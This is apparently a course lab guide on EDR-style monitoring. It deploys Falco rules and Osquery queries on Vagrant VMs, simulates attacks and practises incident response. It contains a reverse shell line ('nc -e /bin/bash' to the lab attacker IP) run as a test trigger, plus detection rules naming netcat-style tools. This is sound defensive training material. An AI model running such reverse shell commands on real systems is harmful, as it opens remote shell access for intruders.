# Week 6 – EDR-style Monitoring (Falco + Osquery)

## Objectives

- Deploy Falco for syscall-based detection
- Explore Osquery for host visibility
- Practice creating and tuning simple rules
- Build targeted detections, validate with attack simulations, and tune noise
- Deploy EDR monitoring across multiple VMs
- Simulate real attacks and observe EDR alerts
- Implement incident response workflows

## Estimated Time

⏱️ **2-2.5 hours** (including VM setup and all exercises)

This lab covers:
- VM setup and verification (~10-15 minutes)
- Falco deployment and configuration (~30-40 minutes)
- Osquery setup and exploration (~30-40 minutes)
- Attack simulation and detection (~40-50 minutes)

**Tip:** If using logserver for alert collection, add 15-20 minutes for integration setup.

## VM Setup for This Lab

Start the required VMs:
```bash
cd /path/to/devops-tutorial
vagrant up attacker monitored
# Optional: add logserver if you want to forward Falco alerts
```

**VM Roles in This Lab:**
- **monitored** (192.168.220.40) - **PRIMARY FOCUS**: Deploy Falco and Osquery here to monitor for suspicious activity
- **attacker** (192.168.210.10) - Generate suspicious activity and attacks to trigger EDR alerts
- **logserver** (optional) - Forward Falco alerts here for centralized analysis

**Lab Flow:**
1. Deploy Falco and Osquery on **monitored**
2. Generate suspicious activity from **attacker** targeting **monitored**
3. Observe EDR alerts and detections on **monitored**
4. (Optional) Forward alerts to **logserver** for centralized monitoring
5. Tune rules to reduce false positives

See [VM Setup Guide](../../VM-SETUP.md) for detailed instructions.

## Tasks

### 1. Deploy Falco on Monitored Host

1. Install Falco on monitored VM:

   ```bash
   vagrant ssh monitored
   
   # Install Falco using Docker (easier for labs)
   sudo docker pull falcosecurity/falco:latest
   
   # Create Falco config directory
   sudo mkdir -p /etc/falco /var/log/falco
   
   # Create custom Falco rules
   sudo tee /etc/falco/falco_rules.local.yaml > /dev/null <<'EOF'
   - rule: Suspicious Shell Spawned in Container
     desc: Detect shell access in containers
     condition: >
       spawned_process and container and 
       (proc.name in (sh, bash, zsh, ash)) and
       not proc.pname in (systemd, sshd, containerd)
     output: >
       Shell spawned in container 
       (user=%user.name container=%container.name shell=%proc.name 
       parent=%proc.pname cmdline=%proc.cmdline)
     priority: WARNING
     tags: [container, shell, mitre_execution]
   
   - rule: SSH Config Modification
     desc: Detect changes to SSH configuration
     condition: >
       open_write and 
       fd.name startswith /etc/ssh/
     output: >
       SSH config modified 
       (user=%user.name file=%fd.name proc=%proc.name cmdline=%proc.cmdline)
     priority: WARNING
     tags: [filesystem, ssh, mitre_persistence]
   
   - rule: Reverse Shell Detected
     desc: Detect potential reverse shell
     condition: >
       spawned_process and 
       ((proc.name in (nc, netcat, ncat, socat)) and 
        (proc.args contains "-e" or proc.args contains "-c"))
     output: >
       Potential reverse shell 
       (user=%user.name proc=%proc.name cmdline=%proc.cmdline)
     priority: CRITICAL
     tags: [network, reverse_shell, mitre_command_and_control]
   EOF
   
   # Run Falco
   sudo docker run --rm -d \
     --name falco \
     --privileged \
     -v /var/run/docker.sock:/host/var/run/docker.sock \
     -v /dev:/host/dev \
     -v /proc:/host/proc:ro \
     -v /etc:/host/etc:ro \
     -v /etc/falco:/etc/falco \
     -v /var/log/falco:/var/log/falco \
     falcosecurity/falco:latest \
     falco -o log_level=info -o file_output.enabled=true \
     -o file_output.filename=/var/log/falco/events.log
   
   # Wait for Falco to start
   sleep 5
   
   # Check Falco is running
   sudo docker ps | grep falco
   
   # Tail Falco logs
   sudo tail -f /var/log/falco/events.log
   ```

2. Verify Falco is detecting events:

   ```bash
   vagrant ssh monitored
   
   # Generate a test event
   sudo bash -c "echo test > /etc/ssh/sshd_config.test"
   
   # Check Falco logs
   sudo tail -20 /var/log/falco/events.log | grep "SSH config"
   ```

   Expected: See alert for SSH config modification.

### 2. Simulate Attacks and Observe EDR

**Attack 1: Container Shell Access**

1. On monitored VM, start a vulnerable container:

   ```bash
   vagrant ssh monitored
   
   # Run nginx container
   sudo docker run -d --name test-web nginx:alpine
   
   # Get shell in container (triggers Falco rule)
   sudo docker exec -it test-web /bin/sh
   
   # Inside container, run commands:
   whoami
   ls -la /
   exit
   ```

2. Check Falco detected it:

   ```bash
   vagrant ssh monitored
   sudo grep "Shell spawned in container" /var/log/falco/events.log
   ```

   Expected: Alert showing shell access with user, container name, and command.

**Attack 2: SSH Backdoor Attempt**

1. From attacker VM, try to modify SSH config on monitored host:

   ```bash
   vagrant ssh attacker
   
   # SSH into monitored host
   ssh vagrant@192.168.220.40
   # Password: vagrant
   
   # Try to modify SSH config (will fail without sudo, but triggers EDR)
   echo "# test" >> /etc/ssh/sshd_config 2>&1
   
   # This will fail but shows intent
   logout
   ```

2. On monitored host, check for alerts:

   ```bash
   vagrant ssh monitored
   sudo grep -i "ssh" /var/log/falco/events.log | tail -10
   ```

**Attack 3: Suspicious Network Activity**

1. From attacker, scan the monitored host:

   ```bash
   vagrant ssh attacker
   sudo nmap -sS -p 1-1000 192.168.220.40
   ```

2. On monitored host, use Osquery to detect:

   ```bash
   vagrant ssh monitored
   
   # Query for unusual network connections
   osqueryi --json "SELECT * FROM listening_ports WHERE port < 1024;"
   
   # Query for recent process network activity (multi-line for readability)
   osqueryi --json "SELECT p.name, p.cmdline, ps.remote_address, ps.remote_port \
     FROM processes p \
     JOIN process_open_sockets ps ON p.pid = ps.pid \
     WHERE ps.remote_address != '0.0.0.0' \
     LIMIT 10;"
   ```

**Attack 4: Reverse Shell Simulation**

1. On monitored host, simulate reverse shell attempt:

   ```bash
   vagrant ssh monitored
   
   # Simulate attacker creating reverse shell
   # (Safe simulation - doesn't actually connect out)
   echo "#!/bin/bash" > /tmp/fake_reverse.sh
   echo "nc -e /bin/bash 192.168.210.10 4444" >> /tmp/fake_reverse.sh
   chmod +x /tmp/fake_reverse.sh
   
   # Run it (will fail but triggers Falco)
   /tmp/fake_reverse.sh &
   sleep 2
   pkill -f fake_reverse
   ```

2. Check Falco logs:

   ```bash
   vagrant ssh monitored
   sudo grep -i "reverse" /var/log/falco/events.log
   ```

   Expected: CRITICAL alert for potential reverse shell.

### 3. Osquery for Host Investigation

1. On monitored VM, run comprehensive Osquery investigation:

   ```bash
   vagrant ssh monitored
   
   # Create investigation query pack
   cat > /tmp/investigation.sql <<'EOF'
   -- Check for unusual users
   SELECT * FROM users WHERE uid >= 1000 AND uid < 65534;
   
   -- Check for suspicious processes
   SELECT pid, name, path, cmdline, uid, start_time 
   FROM processes 
   WHERE name IN ('nc', 'netcat', 'ncat', 'socat', 'bash', 'sh')
   ORDER BY start_time DESC
   LIMIT 20;
   
   -- Check for unauthorized SSH keys
   SELECT * FROM authorized_keys;
   
   -- Check for cron jobs
   SELECT * FROM crontab;
   
   -- Check for files modified in last hour
   SELECT path, mode, uid, gid, mtime 
   FROM file 
   WHERE path LIKE '/etc/%' AND mtime > strftime('%s', 'now', '-1 hour');
   
   -- Check kernel modules
   SELECT name, size, used_by FROM kernel_modules;
   EOF
   
   # Run investigation
   osqueryi < /tmp/investigation.sql
   ```

2. Create scheduled monitoring:

   ```bash
   vagrant ssh monitored
   
   # Create osquery config for continuous monitoring
   sudo tee /etc/osquery/osquery.conf > /dev/null <<'EOF'
   {
     "schedule": {
       "system_info": {
         "query": "SELECT hostname, cpu_brand, physical_memory FROM system_info;",
         "interval": 3600
       },
       "listening_ports": {
         "query": "SELECT * FROM listening_ports WHERE port < 1024;",
         "interval": 300
       },
       "suspicious_processes": {
         "query": "SELECT * FROM processes WHERE name IN ('nc', 'netcat', 'ncat');",
         "interval": 60
       },
       "failed_logins": {
         "query": "SELECT * FROM logged_in_users WHERE type = 'failed';",
         "interval": 300
       }
     },
     "packs": {
       "incident-response": "/usr/share/osquery/packs/incident-response.conf"
     }
   }
   EOF
   
   # Restart osquery
   sudo systemctl restart osqueryd
   sudo systemctl status osqueryd
   ```

### 4. Incident Response Workflow

1. **Detection Phase:** Review all alerts

   ```bash
   vagrant ssh monitored
   
   # Get all Falco alerts from last hour
   sudo cat /var/log/falco/events.log | jq -r 'select(.priority != null) | "\(.time) - \(.priority) - \(.rule) - \(.output)"' 2>/dev/null || sudo grep -E "Warning|Critical" /var/log/falco/events.log
   ```

2. **Investigation Phase:** Gather evidence

   ```bash
   vagrant ssh monitored
   
   # Create incident report
   cat > /tmp/incident_report.txt <<EOF
   INCIDENT INVESTIGATION REPORT
   =============================
   Date: $(date)
   Host: $(hostname)
   Investigator: $(whoami)
   
   TIMELINE OF EVENTS:
   EOF
   
   # Add Falco alerts
   echo "=== Falco Alerts ===" >> /tmp/incident_report.txt
   sudo tail -50 /var/log/falco/events.log >> /tmp/incident_report.txt
   
   # Add process information
   echo "=== Running Processes ===" >> /tmp/incident_report.txt
   osqueryi --json "SELECT pid, name, cmdline, uid FROM processes WHERE uid >= 1000;" >> /tmp/incident_report.txt
   
   # Add network connections
   echo "=== Network Connections ===" >> /tmp/incident_report.txt
   osqueryi --json "SELECT * FROM listening_ports;" >> /tmp/incident_report.txt
   
   # Review report
   cat /tmp/incident_report.txt
   ```

3. **Containment Phase:** Take defensive actions

   ```bash
   vagrant ssh monitored
   
   # Block attacker IP with firewall
   sudo nft add table inet security
   sudo nft add chain inet security input '{ type filter hook input priority 0; }'
   sudo nft add rule inet security input ip saddr 192.168.210.10 counter log prefix "BLOCKED_ATTACKER " drop
   
   # Verify block
   sudo nft list ruleset | grep -A 2 security
   ```

4. **Recovery Phase:** Document and remediate

   ```bash
   vagrant ssh monitored
   
   # Remove suspicious files
   rm -f /tmp/fake_reverse.sh
   
   # Kill suspicious processes
   pkill -f suspicious_process_name
   
   # Reset SSH config
   sudo cp /etc/ssh/sshd_config.bak /etc/ssh/sshd_config 2>/dev/null || echo "Config OK"
   
   # Document lessons learned
   cat >> /tmp/incident_report.txt <<'EOF'
   
   REMEDIATION ACTIONS:
   - Blocked attacker IP 192.168.210.10
   - Removed malicious files
   - Verified system integrity
   
   LESSONS LEARNED:
   - Falco effectively detected container shell access
   - Osquery provided valuable host visibility
   - Need to improve SSH hardening
   - Consider implementing fail2ban
   EOF
   ```

### Original Tasks (for reference)

1. Install or run Falco (e.g., via Helm) using `falco-values.yaml` as a minimal config.
2. Review Falco alerts and note any noisy rules to tune.
3. Run Osquery with `osquery-queries.sql` and inspect the output.
4. Optionally integrate alerts into a SIEM or log forwarder.

Expected output hints:

- `falco --list` should include built-in rules plus any custom ones you add; Falco logs land at `/var/log/falco.log` or stdout with `Notice`/`Warning` severities.
- `osqueryi --json "select name, path from processes limit 3;"` returns a JSON array with process names (e.g., `systemd`, `bash`).

### Advanced: Detection engineering loop

1. **Custom Falco rules**
   - Add a rule to detect shell access in a container started from `/bin/sh` or `/busybox/sh`.
   - Add another rule to catch writes to `/etc/ssh/sshd_config` and tag it with `MITRE=T1078`.
   - Reload Falco and verify the new rules appear in `falco --list` output.

2. **Trigger events intentionally**
   - Start an alpine container and run `/bin/sh`; confirm Falco emits the custom container shell alert.
   - Append a dummy line to `/etc/ssh/sshd_config` (in a controlled lab VM) and ensure Falco logs the MITRE-tagged event.

3. **Tune noise**
   - Identify at least one noisy rule (e.g., Kubernetes health checks) and suppress it with `exception` blocks or by scoping to namespaces.
   - Keep a changelog in `falco-values.yaml` comments about what you silenced and why.

4. **Osquery schedule + diffing**
   - Extend `osquery-queries.sql` with a scheduled query that snapshots `/etc/passwd` and `/etc/group`.
   - Run osqueryd in `--config_path` mode and capture the differential output showing adds/removes when you create a test user.

5. **Alert forwarding**
   - Pipe Falco output to a webhook or stdout and ship it via Filebeat/Fluent Bit to your SIEM from Week 5.
   - Confirm the custom rule events are searchable with the same MITRE tag or rule name.

### Example solutions / what “good” looks like

- Falco logs include entries like `Container shell spawned with /bin/sh` and `Write below etc: /etc/ssh/sshd_config` with matching rule names you added.
- Noise tuning comments describe the suppressed namespaces/processes, and Falco alert volume drops after applying them.
- Osquery differential output shows before/after rows when adding a temporary user, proving schedule + stateful detection works.
- SIEM ingestion shows Falco alerts with fields for `rule`, `priority`, and your MITRE tag, enabling dashboarding.
- `osqueryd` logs show `Diff Results` blocks where `added` contains the new user row and `removed` reverts after deletion, confirming snapshot + differential config functions.

## Checklist

### Basic Tasks
- [ ] Falco deployed with JSON output enabled
- [ ] Osquery queries run successfully
- [ ] Notes on noisy Falco rules and potential tuning
- [ ] Custom Falco rules added and triggered with test actions
- [ ] At least one noisy rule tuned with documented rationale
- [ ] Osquery scheduled query diff reviewed after user add/remove
- [ ] Falco alerts forwarded to SIEM/log collector with tags

### VM-Based EDR Tasks
- [ ] Deployed Falco on monitored VM using Docker
- [ ] Created custom Falco rules for container shells and SSH config changes
- [ ] Simulated container shell access and verified Falco detection
- [ ] Attempted SSH backdoor and observed EDR alert
- [ ] Simulated reverse shell and verified CRITICAL priority alert
- [ ] Used Osquery to investigate suspicious processes and network connections
- [ ] Configured osqueryd for scheduled monitoring
- [ ] Completed full incident response workflow (detect, investigate, contain, recover)
- [ ] Blocked attacker IP using nftables after detection
- [ ] Created incident report with timeline and evidence

### Advanced Understanding
- [ ] Can explain how Falco uses syscalls for detection
- [ ] Understand difference between EDR alerts and SIEM logs
- [ ] Know how to use Osquery for live forensics
- [ ] Can execute incident response playbook from detection to remediation
- [ ] Understand MITRE ATT&CK framework tags in detections


### Advanced EDR Deployment and Operations

While lab deployments teach the basics, production EDR requires sophisticated strategies for enterprise-scale monitoring, detection, and response.

**Week 6 Production Readiness Checklist:**
- [ ] Can design enterprise EDR architecture
- [ ] Understand agent deployment strategies
- [ ] Know how to tune for performance vs visibility
- [ ] Can write custom Falco rules for specific threats
- [ ] Proficient in Osquery for forensic investigation
- [ ] Understand automated response workflows
- [ ] Can integrate EDR with SIEM and SOAR
- [ ] Know how to measure EDR effectiveness
- [ ] Can execute full incident response with EDR
- [ ] Understand EDR's role in defense-in-depth

**EDR Mastery Indicators:**
- [ ] Created 10+ custom Falco rules with <5% false positive rate
- [ ] Conducted threat hunt that discovered previously unknown threat
- [ ] Responded to simulated ransomware attack in <15 minutes
- [ ] Built automated response playbook for 3+ attack types
- [ ] Integrated EDR alerts with ticketing system
- [ ] Tuned rules to reduce alerts by 50% while maintaining coverage
- [ ] Documented 5+ incident response procedures
- [ ] Trained team members on EDR tools and workflows
- [ ] Achieved >80% MITRE ATT&CK coverage
- [ ] Contributed to open-source EDR rules (Falco, osquery)

## Final Thoughts: EDR Best Practices

1. **Defense in Depth:** EDR is one layer. Combine with firewall, IDS, SIEM, and other controls.
2. **Tune Aggressively:** High false positives lead to alert fatigue. Better 10 accurate alerts than 1000 noisy ones.
3. **Automate Wisely:** Automate containment for known threats, but require human judgment for ambiguous cases.
4. **Hunt Proactively:** Don't just wait for alerts. Actively hunt for threats using EDR data.
5. **Document Everything:** Every incident is a learning opportunity. Document for future improvement.
6. **Test Regularly:** Run simulated attacks to validate EDR detection and response capabilities.
7. **Keep Learning:** Threat landscape evolves. Stay current with new attack techniques and detection methods.
8. **Community Engagement:** Share rules, techniques, and lessons learned with the security community.
9. **Metrics-Driven:** Measure effectiveness and continuously improve based on data.
10. **Human Element:** Technology is critical, but trained analysts make the real difference.
